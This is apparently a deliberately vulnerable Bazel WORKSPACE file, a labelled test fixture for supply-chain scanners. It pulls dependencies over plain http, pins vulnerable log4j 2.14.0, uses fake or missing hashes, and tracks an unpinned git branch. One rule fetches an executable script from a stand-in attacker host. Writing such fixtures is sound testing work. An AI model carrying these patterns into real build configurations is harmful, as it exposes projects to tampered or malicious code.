# Bazel WORKSPACE file with intentional vulnerability patterns
workspace(name = "vulnmonolith")

load("@bazel_tools//tools/build_defs/repo:http.bzl", "http_archive")
load("@bazel_tools//tools/build_defs/repo:git.bzl", "git_repository")

# VULNERABILITY: Using http instead of https
http_archive(
    name = "com_google_protobuf",
    urls = ["http://github.com/protocolbuffers/protobuf/archive/v3.19.0.tar.gz"],  # HTTP!
    strip_prefix = "protobuf-3.19.0",
)

# VULNERABILITY: Pinned to vulnerable version
http_archive(
    name = "com_github_log4j",
    urls = ["https://github.com/apache/logging-log4j2/archive/rel/2.14.0.tar.gz"],  # Vulnerable!
    strip_prefix = "logging-log4j2-rel-2.14.0",
    sha256 = "abc123...",  # Not a real hash
)

# VULNERABILITY: No integrity check (missing sha256)
http_archive(
    name = "com_github_jackson",
    urls = ["https://github.com/FasterXML/jackson-core/archive/jackson-core-2.9.8.tar.gz"],
)

# VULNERABILITY: Using git without commit pin
git_repository(
    name = "unsafe_dependency",
    remote = "https://github.com/example/unsafe-lib.git",
    branch = "main",  # No commit hash, can change
)

# VULNERABILITY: Loading from arbitrary URL
load("@bazel_tools//tools/build_defs/repo:http.bzl", "http_file")
http_file(
    name = "external_script",
    urls = ["http://attacker.com/malicious.sh"],  # Arbitrary external script
    executable = True,
)

# Rules with outdated dependencies
http_archive(
    name = "io_bazel_rules_go",
    urls = ["https://github.com/bazelbuild/rules_go/releases/download/v0.24.0/rules_go-v0.24.0.tar.gz"],
    sha256 = "...",
)

http_archive(
    name = "rules_python",
    urls = ["https://github.com/bazelbuild/rules_python/releases/download/0.1.0/rules_python-0.1.0.tar.gz"],
    sha256 = "...",
)
